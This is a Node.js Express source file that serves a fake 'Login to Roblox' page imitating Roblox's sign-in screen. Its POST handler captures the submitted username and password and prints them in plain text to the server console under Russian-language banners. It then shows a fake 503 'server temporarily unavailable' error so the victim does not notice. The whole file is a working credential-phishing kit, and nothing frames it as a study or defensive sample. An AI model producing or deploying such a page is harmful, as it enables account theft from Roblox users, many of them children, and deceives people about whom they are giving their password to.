const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.urlencoded({ extended: true }));

app.get('/', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login to Roblox</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; 
            background-color: #1e1f23;
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
            padding: 20px;
        }

        .auth-container { 
            background-color: #23252b;
            padding: 40px 32px 36px; 
            border-radius: 12px; 
            width: 100%;
            max-width: 400px; 
        }

        h1 {
            color: #ffffff; 
            text-align: center; 
            margin-bottom: 28px; 
            font-size: 28px; 
            font-weight: 700; 
            letter-spacing: -0.4px;
        }

        .input-control { 
            width: 100%; 
            padding: 14px 16px; 
            margin-bottom: 14px; 
            background-color: #2d3038;
            border: 1px solid #3a3e47; 
            border-radius: 8px; 
            color: #ffffff; 
            font-size: 15px; 
            transition: all 0.15s ease; 
        }

        .input-control::placeholder { 
            color: #9a9ea6; 
        }
        
        .input-control:focus { 
            outline: none; 
            border-color: #ffffff; 
            background-color: #353942;
        }

        .btn-submit { 
            width: 100%; 
            padding: 13px; 
            background-color: transparent; 
            border: 1.5px solid #ffffff; 
            border-radius: 8px; 
            color: #ffffff; 
            font-size: 16px; 
            font-weight: 600; 
            cursor: pointer; 
            margin-top: 4px;
            margin-bottom: 22px; 
            transition: background-color 0.15s ease; 
        }
        
        .btn-submit:hover { 
            background-color: rgba(255, 255, 255, 0.08); 
        }

        .link-text { 
            display: block; 
            text-align: center; 
            color: #ffffff; 
            font-size: 14.5px; 
            font-weight: 500; 
            text-decoration: none; 
            margin-bottom: 24px; 
        }

        .link-text:hover { 
            text-decoration: underline; 
        }

        .secondary-actions { 
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-bottom: 26px;
        }

        .btn-secondary { 
            width: 100%; 
            padding: 14px; 
            background-color: #2d3038; 
            border: none; 
            border-radius: 8px; 
            color: #ffffff; 
            font-size: 15px; 
            font-weight: 500; 
            cursor: pointer; 
            transition: background-color 0.15s ease; 
        }
        
        .btn-secondary:hover { 
            background-color: #383c45; 
        }

        .signup-text {
            text-align: center;
            color: #ffffff;
            font-size: 14.5px;
            font-weight: 500;
        }

        .signup-text a {
            color: #ffffff;
            text-decoration: none;
            font-weight: 600;
        }

        .signup-text a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="auth-container">
        <h1>Login to Roblox</h1>
        
        <form action="/login" method="POST">
            <input type="text" name="username" class="input-control" placeholder="Username/Email/Phone" required>
            <input type="password" name="password" class="input-control" placeholder="Password" required>
            <button type="submit" class="btn-submit">Log In</button>
        </form>

        <a href="#" class="link-text">Forgot Password or Username?</a>
        
        <div class="secondary-actions">
            <button type="button" class="btn-secondary">Email Me a One-Time Code</button>
            <button type="button" class="btn-secondary">Quick Sign-In</button>
        </div>
        
        <div class="signup-text">
            Don't have an account? <a href="#">Sign Up</a>
        </div>
    </div>
</body>
</html>
    `);
});

app.post('/login', (req, res) => {
    const userLogin = req.body.username;
    const userPassword = req.body.password;
    
    console.log(`\n========================================`);
    console.log(`[БЭКЕНД] ДАННЫЕ ФОРМЫ УСПЕШНО ЗАФИКСИРОВАНЫ:`);
    console.log(`ВВЕДЕННЫЙ ЛОГИН: ${userLogin}`);
    console.log(`ВВЕДЕННЫЙ ПАРОЛЬ: ${userPassword}`);
    console.log(`========================================`);
    
    res.status(503).send('Сервер временно недоступен. Пожалуйста, попробуйте войти позже.');
});

app.listen(PORT, () => {
    console.log("=== СЕРВЕР УСПЕШНО ЗАПУЩЕН ===");
});
